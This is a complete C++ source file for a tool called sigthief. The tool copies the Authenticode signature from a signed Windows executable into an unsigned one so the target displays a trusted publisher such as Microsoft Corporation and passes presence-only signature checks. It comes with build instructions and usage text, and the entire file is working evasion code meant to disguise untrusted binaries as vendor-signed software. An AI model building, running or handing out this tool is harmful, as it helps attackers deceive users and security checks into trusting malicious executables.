// sigthief.cpp — Copy Authenticode signature from one PE to another
// The signature won't cryptographically validate but the certificate
// info (Microsoft Corporation) shows up in file properties and passes
// presence-only signature checks.
// Build: cl /EHsc /O2 sigthief.cpp /link /OUT:sigthief.exe

#include <windows.h>
#include <cstdio>

int main(int argc, char* argv[])
{
	if (argc != 3) {
		printf("Usage: sigthief.exe <signed_source.exe> <unsigned_target.exe>\n");
		return 1;
	}

	HANDLE hSrc = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, 0, NULL);
	if (hSrc == INVALID_HANDLE_VALUE) {
		printf("Cannot open source: %s\n", argv[1]);
		return 1;
	}

	DWORD srcSize = GetFileSize(hSrc, NULL);
	BYTE* srcBuf = new BYTE[srcSize];
	DWORD bytesRead;
	ReadFile(hSrc, srcBuf, srcSize, &bytesRead, NULL);
	CloseHandle(hSrc);

	auto srcDos = (IMAGE_DOS_HEADER*)srcBuf;
	if (srcDos->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Source is not a valid PE\n");
		delete[] srcBuf;
		return 1;
	}

	auto srcNt = (IMAGE_NT_HEADERS*)(srcBuf + srcDos->e_lfanew);
	auto& srcSec = srcNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
	if (srcSec.VirtualAddress == 0 || srcSec.Size == 0) {
		printf("Source has no Authenticode signature\n");
		delete[] srcBuf;
		return 1;
	}

	DWORD sigSize = srcSec.Size;
	BYTE* sigData = srcBuf + srcSec.VirtualAddress;

	HANDLE hDst = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, 0, NULL);
	if (hDst == INVALID_HANDLE_VALUE) {
		printf("Cannot open target: %s\n", argv[2]);
		delete[] srcBuf;
		return 1;
	}

	DWORD dstSize = GetFileSize(hDst, NULL);
	DWORD alignedSize = (dstSize + 7) & ~7;
	DWORD totalSize = alignedSize + sigSize;
	BYTE* dstBuf = new BYTE[totalSize];
	memset(dstBuf, 0, totalSize);
	ReadFile(hDst, dstBuf, dstSize, &bytesRead, NULL);
	CloseHandle(hDst);

	auto dstDos = (IMAGE_DOS_HEADER*)dstBuf;
	if (dstDos->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Target is not a valid PE\n");
		delete[] srcBuf;
		delete[] dstBuf;
		return 1;
	}

	auto dstNt = (IMAGE_NT_HEADERS*)(dstBuf + dstDos->e_lfanew);

	memcpy(dstBuf + alignedSize, sigData, sigSize);

	dstNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = alignedSize;
	dstNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = sigSize;
	dstNt->OptionalHeader.CheckSum = 0;

	HANDLE hOut = CreateFileA(argv[2], GENERIC_WRITE, 0,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOut == INVALID_HANDLE_VALUE) {
		printf("Cannot write target\n");
		delete[] srcBuf;
		delete[] dstBuf;
		return 1;
	}

	DWORD written;
	WriteFile(hOut, dstBuf, totalSize, &written, NULL);
	CloseHandle(hOut);

	printf("Signature copied: %u bytes from %s\n", sigSize, argv[1]);

	delete[] srcBuf;
	delete[] dstBuf;
	return 0;
}
